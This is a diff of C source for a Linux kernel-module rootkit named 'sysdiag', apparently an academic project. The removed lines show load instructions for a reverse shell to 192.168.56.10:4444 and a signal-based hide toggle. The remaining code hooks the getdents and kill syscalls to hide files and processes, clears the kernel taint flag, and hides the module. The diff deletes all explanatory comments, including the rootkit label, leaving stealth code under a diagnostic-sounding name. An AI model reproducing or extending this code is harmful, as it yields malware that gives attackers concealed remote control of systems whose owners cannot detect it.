@@ -1,34 +1,13 @@
-/*
- * sysdiag - minimal educational LKM rootkit (FYP build)
- * Ported from "rasta" to RHEL 7 / kernel 3.10, scope-limited per
- * project requirements: reverse shell + stealth, no privesc.
- *
- * Load:  insmod sysdiag.ko attacker_ip=192.168.56.10 attacker_port=4444
- * Toggle visibility:  kill -33 1
- * Unload:             kill -33 1 && rmmod sysdiag
- */
+
 
 #include "include/headers.h"
 
-/* ---- load-time parameters (must be defined BEFORE rev-shell.h) ---- */
-static char *attacker_ip   = "192.168.56.10";
-static int   attacker_port = 4444;
-module_param(attacker_ip, charp, 0);
-module_param(attacker_port, int, 0);
-MODULE_PARM_DESC(attacker_ip,   "IP the reverse shell connects back to");
-MODULE_PARM_DESC(attacker_port, "Port the reverse shell connects back to");
 
-/* 0 = visible after load (easy demo/uninstall), 1 = hide immediately */
 #define AUTO_HIDE 0
 
 /* hooking engine (syscall-table swap) */
 #include "ftrace/ftrace.h"
 
-/* hooks - ORDER MATTERS:
- *   getdents.h first  -> defines PREFIX, MARKER, filter_dirents(),
- *                         struct linux_dirent (used by getdents64.h, read.h)
- *   read.h            -> defines hide_conn_init(), hooked_read
- *   rev-shell.h       -> uses attacker_ip/attacker_port + MARKER       */
 #include "hooks/getdents.h"
 #include "hooks/getdents64.h"
 #include "hooks/kill.h"
@@ -43,9 +22,6 @@ static struct ftrace_hook hooks[] = {
     HOOK(__NR_kill,       "sys_kill",       hooked_kill,       &og_kill),
 };
 
-/* the kernel sets the taint flag exactly once, during module load
- * (before our init runs) and nothing re-taints it afterwards, so
- * clearing it once here is sufficient. */
 static void clear_taint(void)
 {
     int *taint = (int *)kallsyms_lookup_name("tainted_mask");
@@ -82,7 +58,7 @@ static void __exit sysdiag_exit(void)
     if (mon_it)
         kthread_stop(mon_it);
 
-    if (hidden)          /* safety: never tear down while invisible */
+    if (hidden)          
         showme();
 
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
